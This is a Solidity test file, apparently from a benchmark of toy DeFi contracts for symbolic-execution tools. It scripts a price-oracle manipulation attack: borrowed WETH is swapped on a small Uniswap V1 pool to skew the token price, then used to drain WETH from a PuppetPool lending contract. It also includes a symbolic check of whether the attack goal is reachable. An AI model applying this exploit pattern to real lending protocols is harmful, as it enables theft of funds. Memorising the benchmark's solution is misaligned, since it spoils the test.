// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "@utils/ERC20Basic.sol";
import "@utils/WETH.sol";
import "@utils/QueryBlockchain.sol";
import "@halmos/SymTest.sol";

import "benchmarks/toy/BuySell/PuppetPool.sol";

contract BuySellTest is Test, BlockLoader, SymTest {
    address constant owner = address(0xdeadbeef);

    ERC20Basic token;
    WETH weth;
    UniswapV1 uniswap;
    PuppetPool puppetpool;

    uint256 public constant totalSupply = 1000 ether;
    uint256 public constant feeRate = 15;

    uint256 public constant attackerInitBalance = 0 ether;
    uint256 public constant attackerInitToken = 0 ether;

    uint256 public constant uniswapInitBalance = 10 ether;
    uint256 public constant uniswapInitToken = 10 ether;

    uint256 public constant puppetpoolInitBalance = 100 ether;
    uint256 public constant puppetpoolInitToken = 0 ether;

    uint256 public constant requiredBalance =
        puppetpoolInitBalance + attackerInitBalance;

    function setUp() public {
        vm.startPrank(owner);
        token = new ERC20Basic(totalSupply);
        weth = new WETH(totalSupply);
        uniswap = new UniswapV1(address(token), address(weth), feeRate);
        puppetpool = new PuppetPool(
            address(token),
            address(weth),
            address(uniswap)
        );
        token.transfer(address(uniswap), uniswapInitToken);

        weth.transfer(address(uniswap), uniswapInitBalance);
        weth.transfer(address(puppetpool), puppetpoolInitBalance);

        // Pre-approve to mock the flashloan
        token.approve(self(), UINT256_MAX);
        weth.approve(self(), UINT256_MAX);
        vm.stopPrank();
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        address attacker = self();
        address uniswap_ = address(uniswap);
        address pool_ = address(puppetpool);
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(address(weth), attacker, weth.decimals());
        queryERC20BalanceDecimals(address(token), attacker, token.decimals());
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(address(weth), uniswap_, weth.decimals());
        queryERC20BalanceDecimals(address(token), uniswap_, token.decimals());
        emit log_string("");
        emit log_string("Bank Balances: ");
        queryERC20BalanceDecimals(address(weth), pool_, weth.decimals());
        queryERC20BalanceDecimals(address(token), pool_, token.decimals());
        emit log_string("");
        emit log_string("");
    }

    function self() internal view returns (address) {
        return address(this);
    }

    function nop() internal pure {
        return;
    }

    function borrow_ERC20Basic(uint256 amount) internal {
        token.transferFrom(owner, self(), amount);
    }

    function borrow_WETH(uint256 amount) internal {
        weth.transferFrom(owner, self(), amount);
    }

    function swap_UniswapV1_ERC20Basic_WETH(uint256 amount) internal {
        token.approve(address(uniswap), UINT256_MAX);
        uniswap.swapTokenToWETH(amount);
    }

    function swap_UniswapV1_WETH_ERC20Basic(uint256 amount) internal {
        weth.approve(address(uniswap), UINT256_MAX);
        uniswap.swapWETHToToken(amount);
    }

    function swap_PuppetPool_ERC20Basic_WETH(uint256 amount) internal {
        token.approve(address(puppetpool), UINT256_MAX);
        puppetpool.borrowWETH(amount);
    }

    function hackedAction_PuppetPool_WETH(uint256 amount) internal {
        token.approve(address(puppetpool), UINT256_MAX);
        puppetpool.borrowWETH(amount);
    }

    function payback_ERC20Basic(uint256 amount) internal {
        token.transfer(owner, amount);
    }

    function payback_WETH(uint256 amount) internal {
        weth.transfer(owner, amount);
    }

    function testAttackGT() public {
        printBalance("Before exploit: ");
        
        borrow_WETH(uniswapInitBalance);
        swap_UniswapV1_WETH_ERC20Basic(uniswapInitBalance);
        hackedAction_PuppetPool_WETH(puppetpoolInitBalance);
        swap_UniswapV1_ERC20Basic_WETH(token.balanceOf(self()));
        payback_WETH((uniswapInitBalance * 103) / 100);

        printBalance("After exploit: ");
        require(attackGoal(), "Attack Failed!");
    }

    function check_gt() public {
        uint256 amt0 = svm.createUint256("amt0");
        uint256 amt1 = svm.createUint256("amt1");
        uint256 amt2 = svm.createUint256("amt2");
        uint256 amt3 = svm.createUint256("amt3");
        uint256 amt4 = svm.createUint256("amt4");
        vm.assume(amt4 == (amt0 * 103 / 100));
        borrow_WETH(amt0);
        swap_UniswapV1_WETH_ERC20Basic(amt1);
        hackedAction_PuppetPool_WETH(amt2);
        swap_UniswapV1_ERC20Basic_WETH(amt3);
        payback_WETH(amt4);
        assert(!attackGoal());
    }

    function attackGoal() public view returns (bool) {
        return weth.balanceOf(self()) >= 1 ether;
    }
}
